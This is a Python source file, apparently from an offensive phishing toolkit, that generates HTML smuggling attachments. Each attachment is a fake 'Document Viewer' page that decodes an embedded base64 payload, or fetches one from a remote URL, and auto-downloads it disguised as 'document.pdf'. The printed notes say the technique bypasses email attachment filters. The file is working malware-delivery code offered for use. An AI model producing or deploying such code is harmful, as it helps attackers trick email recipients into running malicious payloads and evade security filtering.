"""
HTML smuggling creator
"""
import os
import base64
from ..core.attachment import Attachment, AttachmentType
from ..utils.encoders import encode_payload

class HTMLCreator:
    """Create HTML smuggling attachments"""
    
    def __init__(self, output_dir: str):
        """
        Initialize HTML creator
        
        Args:
            output_dir: Output directory
        """
        self.output_dir = output_dir
    
    def create_smuggling_html(self, payload_url: str,
                             output_name: str = "document.html",
                             payload_bytes: bytes = None) -> Attachment:
        """
        Create HTML file with smuggled payload
        
        Args:
            payload_url: URL to download payload from
            output_name: Output filename
            payload_bytes: Actual payload bytes to embed (optional)
            
        Returns:
            Attachment object
        """
        output_path = os.path.join(self.output_dir, output_name)
        
        print(f"[*] Creating HTML smuggling file: {output_name}")
        print(f"[*] Payload URL: {payload_url}")
        
        if payload_bytes:
            # Embed payload directly in HTML
            payload_b64 = base64.b64encode(payload_bytes).decode()
            html_content = self._generate_embedded_html(payload_b64)
        else:
            # Reference external payload
            html_content = self._generate_download_html(payload_url)
        
        with open(output_path, 'w') as f:
            f.write(html_content)
        
        print(f"[+] HTML smuggling file created: {output_path}")
        print("\n[*] How HTML smuggling works:")
        print("    • Payload encoded in HTML/JavaScript")
        print("    • Decoded and assembled in browser")
        print("    • 'Downloaded' via JavaScript Blob API")
        print("    • Never touches network (if embedded)")
        print("    • Bypasses email attachment filters")
        
        return Attachment(
            name=output_name,
            attachment_type=AttachmentType.HTML_SMUGGLING,
            output_path=output_path,
            payload_url=payload_url
        )
    
    def _generate_embedded_html(self, payload_b64: str) -> str:
        """Generate HTML with embedded base64 payload"""
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Document Viewer</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }}
        .container {{
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }}
        .spinner {{
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Loading document...</h2>
        <div class="spinner"></div>
        <p>Your download will begin shortly</p>
    </div>
    
    <script>
        // HTML Smuggling - payload is base64 encoded
        function downloadPayload() {{
            try {{
                // Decode base64 payload
                var payload = "{payload_b64}";
                var binary = atob(payload);
                var bytes = new Uint8Array(binary.length);
                for (var i = 0; i < binary.length; i++) {{
                    bytes[i] = binary.charCodeAt(i);
                }}
                
                // Create Blob and download
                var blob = new Blob([bytes], {{type: "application/octet-stream"}});
                var url = URL.createObjectURL(blob);
                var a = document.createElement("a");
                a.href = url;
                a.download = "document.pdf";
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                
                // Update UI
                document.querySelector('.container').innerHTML = 
                    '<h2>✓ Download Complete</h2><p>Please open the downloaded file</p>';
            }} catch(e) {{
                console.error("Download failed:", e);
            }}
        }}
        
        // Auto-download after 1 second
        setTimeout(downloadPayload, 1000);
    </script>
</body>
</html>'''
    
    def _generate_download_html(self, payload_url: str) -> str:
        """Generate HTML that downloads from URL"""
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Document Viewer</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }}
        .container {{
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }}
    </style>
</head>
<body>
    <div class="container">
        <h2>Loading document...</h2>
        <p>Please wait</p>
    </div>
    
    <script>
        // Download payload from URL
        async function downloadFile() {{
            try {{
                const response = await fetch("{payload_url}");
                const blob = await response.blob();
                const url = URL.createObjectURL(blob);
                const a = document.createElement("a");
                a.href = url;
                a.download = "document.pdf";
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }} catch(e) {{
                console.error("Download failed:", e);
            }}
        }}
        
        setTimeout(downloadFile, 1000);
    </script>
</body>
</html>'''